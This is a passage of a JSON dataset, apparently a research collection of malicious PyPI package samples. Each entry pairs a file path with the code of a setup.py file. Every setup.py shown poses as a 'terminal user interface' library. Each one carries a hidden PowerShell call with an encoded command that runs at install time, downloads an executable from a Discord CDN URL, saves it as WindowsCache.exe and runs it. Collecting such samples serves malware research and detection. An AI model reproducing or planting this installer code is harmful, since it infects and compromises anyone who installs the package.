'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqstringpingcraft-v7.91",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstringpingcraft',\n    packages = ['modlib'],\n    version = '7.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqstringvirtualtool-v5.32",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstringvirtualtool',\n    packages = ['modlib'],\n    version = '8.82',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqstrpushgrand-v6.62",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstrpushgrand',\n    packages = ['modlib'],\n    version = '7.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqstudyedgrand-v10.14",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstudyedgrand',\n    packages = ['modlib'],\n    version = '1.16',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqveradvirtual-v10.8",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqveradvirtual',\n    packages = ['modlib'],\n    version = '1.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqvirtualkillint-v4.83",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqvirtualkillint',\n    packages = ['modlib'],\n    version = '2.38',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqvisaverload-v3.62",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqvisaverload',\n    packages = ['modlib'],\n    version = '7.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libadtoolmc-v9.41",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libadtoolmc',\n    packages = ['modlib'],\n    version = '2.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libcontrolrehydra-v8.33",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcontrolrehydra',\n    packages = ['modlib'],\n    version = '6.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libcontrolultravm-v2.33",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcontrolultravm',\n    packages = ['modlib'],\n    version = '8.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libcraftsuperre-v10.62",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcraftsuperre',\n    packages = ['modlib'],\n    version = '7.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libedgetstudy-v5.70",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libedgetstudy',\n    packages = ['modlib'],\n    version = '3.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libgrandrandomintel-v3.58",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libgrandrandomintel',\n    packages = ['modlib'],\n    version = '8.95',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libgrandverultra-v6.20",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libgrandverultra',\n    packages = ['modlib'],\n    version = '8.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      